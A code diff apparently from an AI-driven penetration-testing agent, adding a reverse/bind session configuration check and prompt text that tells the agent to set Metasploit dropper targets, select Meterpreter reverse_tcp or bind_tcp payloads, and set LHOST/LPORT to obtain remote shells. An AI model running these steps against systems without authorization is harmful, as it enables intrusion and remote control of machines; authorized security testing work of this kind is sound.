@@ -272,6 +272,45 @@ def extract_response(state: AgentState) -> Dict[str, Any]:
     }
 
 
+def is_session_config_complete() -> tuple[bool, list[str]]:
+    """
+    Check if session configuration is complete for exploitation.
+
+    Decision Logic:
+        IF LPORT is set (not None, > 0):
+            → Use REVERSE payload (target connects TO attacker)
+            → Requires: LHOST + LPORT
+        ELSE IF BIND_PORT_ON_TARGET is set:
+            → Use BIND payload (attacker connects TO target)
+            → Requires: BIND_PORT_ON_TARGET only (no LHOST needed)
+        ELSE:
+            → No mode configured, cannot proceed
+
+    Returns:
+        Tuple of (is_complete, missing_params_list)
+        - is_complete: True if all required params are set
+        - missing_params_list: List of parameter names that are missing
+    """
+    use_reverse = LPORT is not None and LPORT > 0
+    use_bind = not use_reverse and BIND_PORT_ON_TARGET is not None and BIND_PORT_ON_TARGET > 0
+
+    missing = []
+
+    if use_reverse:
+        # REVERSE mode: need LHOST and LPORT
+        if not LHOST:
+            missing.append("LHOST")
+        # LPORT is already set (that's why use_reverse is True)
+    elif use_bind:
+        # BIND mode: only needs BIND_PORT_ON_TARGET, which is already set
+        pass
+    else:
+        # Neither mode configured - need at least one
+        missing.append("LPORT or BIND_PORT_ON_TARGET")
+
+    return (len(missing) == 0, missing)
+
+
 def get_session_config_prompt() -> str:
     """
     Generate a prompt section with pre-configured payload settings.
@@ -356,15 +395,30 @@ def get_session_config_prompt() -> str:
 
         lines.append(f"**Payload type:** `{conn_type}` ({reason})")
         lines.append("")
+        lines.append("**IMPORTANT: You MUST first set TARGET to Dropper/Staged!**")
+        lines.append("```")
+        lines.append("show targets")
+        lines.append("set TARGET 0   # Choose 'Automatic (Dropper)' or similar")
+        lines.append("```")
+        lines.append("")
+        lines.append("**Then select a Meterpreter reverse payload from `show payloads`:**")
+        lines.append("")
+        lines.append(f"Look for payloads with `meterpreter/{conn_type}` in the name:")
+        lines.append(f"- `cmd/unix/php/meterpreter/{conn_type}` (for PHP targets)")
+        lines.append(f"- `cmd/unix/python/meterpreter/{conn_type}` (for Python targets)")
+        lines.append(f"- `linux/x64/meterpreter/{conn_type}` (for native targets)")
+        lines.append("")
         lines.append("**Metasploit commands:**")
         lines.append("```")
-        lines.append(f"set PAYLOAD <os>/<arch>/meterpreter/{conn_type}")
+        lines.append(f"set PAYLOAD cmd/unix/python/meterpreter/{conn_type}  # Or appropriate variant")
         if LHOST:
             lines.append(f"set LHOST {LHOST}")
         else:
             lines.append("set LHOST <ASK USER FOR IP>")
         lines.append(f"set LPORT {LPORT}")
         lines.append("```")
+        lines.append("")
+        lines.append(f"After exploit succeeds, use `msf_wait_for_session()` to wait for session.")
 
     elif use_bind:
         # =====================================================================
@@ -379,14 +433,27 @@ def get_session_config_prompt() -> str:
         lines.append("└─────────────┘                    └─────────────┘")
         lines.append("```")
         lines.append("")
+        lines.append("**⚠️ IMPORTANT: You MUST first set TARGET to Dropper/Staged!**")
+        lines.append("```")
+        lines.append("show targets")
+        lines.append("set TARGET 0   # Choose 'Automatic (Dropper)' or similar")
+        lines.append("```")
+        lines.append("")
+        lines.append("**Then select a Meterpreter bind payload from `show payloads`:**")
+        lines.append("")
+        lines.append("Look for payloads with `meterpreter/bind_tcp` in the name:")
+        lines.append("- `cmd/unix/php/meterpreter/bind_tcp` (for PHP targets)")
+        lines.append("- `cmd/unix/python/meterpreter/bind_tcp` (for Python targets)")
+        lines.append("- `linux/x64/meterpreter/bind_tcp` (for native targets)")
+        lines.append("")
         lines.append("**Metasploit commands:**")
         lines.append("```")
-        lines.append("set PAYLOAD <os>/<arch>/meterpreter/bind_tcp")
+        lines.append("set PAYLOAD cmd/unix/python/meterpreter/bind_tcp  # Or appropriate variant")
         lines.append(f"set LPORT {BIND_PORT_ON_TARGET}")
         lines.append("```")
         lines.append("")
         lines.append("**Note:** NO LHOST needed for bind payloads!")
-        lines.append(f"After exploit, connect to target: `RHOST:{BIND_PORT_ON_TARGET}`")
+        lines.append(f"After exploit succeeds, use `msf_wait_for_session()` to wait for connection.")
 
     else:
         # =====================================================================
